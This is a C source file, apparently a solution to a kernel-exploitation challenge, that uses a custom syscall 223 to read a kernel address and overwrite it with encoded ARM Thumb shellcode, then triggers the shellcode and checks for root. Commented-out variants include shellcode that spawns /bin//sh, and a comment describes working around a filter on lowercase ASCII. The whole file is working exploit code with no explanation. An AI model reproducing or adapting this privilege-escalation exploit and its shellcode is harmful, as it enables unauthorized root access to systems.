#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/syscall.h>

// XXX: We need to avoid ascii a-z
/* char* sc = "\x01\x30\x8f\xe2" */
/*            "\x13\xff\x2f\xe1" */
/*            "\x78\x46\x0e\x30" */
/*            "\x01\x90\x49\x1a" */
/*            "\x92\x1a\x08\x27" */
/*            "\xc2\x51\x03\x37" */
/*            "\x01\xdf\x2f\x62" */
/*            "\x69\x6e\x2f\x2f" */
/*            "\x73\x68"; */

char sc[] = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7d\x46\x50\x35\x28\x46\xc0\x46\xc0\x46\x01\x90\x46\xf2\x10\x05\x05\xf2\x1f\x25\x05\x80\xc0\x46\x46\xf2\x10\x05\x05\xf6\x05\x15\x05\xf2\x54\x55\x45\x80\xc0\x46\x46\xf2\x10\x05\x05\xf6\x5f\x15\x05\xf2\x22\x55\x05\xf2\x3d\x45\x85\x80\xc0\x46\x4f\xf0\x5f\x05\x05\xf1\x09\x05\xc5\x80\xc0\x46\x49\x1a\x92\x1a\x6d\x1b\xc0\x46\x0b\x27\x01\xdf\x44\x43\x42\x41\x42\x42\x42\x42\x43\x43\x43\x00";

/* char sc[] = "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x01\xb5\x92\x1a" */
/*             "\x10\x1c\xf0\x46\x02\x4a\x90\x47\x02\x4a\x1c\x32" */
/*             "\x90\x47\x01\xbd\x24\xf9\x03\x80\x50\xf5\x03\x80"; */

int main() {
  char victim_addr[4];
  syscall(223, 0x8000e348 + 4*1, victim_addr);
  printf("Victim addr: 0x%x\n", *(unsigned int*) victim_addr);

  printf("victim_addr  = 0x%x\n", victim_addr);
  printf("*victim_addr = 0x%x\n", *(unsigned int*) victim_addr);
  syscall(223, sc, *(unsigned int*) victim_addr);
  // syscall(223, sc, 0x800225e4);

  printf("Written!\n");

  // Check if victim has been rewritten
  /* char buf[256]; */
  /* syscall(223, victim_addr, buf); */
  /* for (int i=0; i < 256 && buf[i] != '\0'; i++) { */
  /*   printf("%d: 0x%02x\n", i, buf[i]); */
  /* } */

  syscall(1);

  if (getuid()) {
    perror("[-] Something went wrong\n");
    return -1;
  }
 
  printf("[+] Got r00t\n");

  printf("About to exit...\n");
}
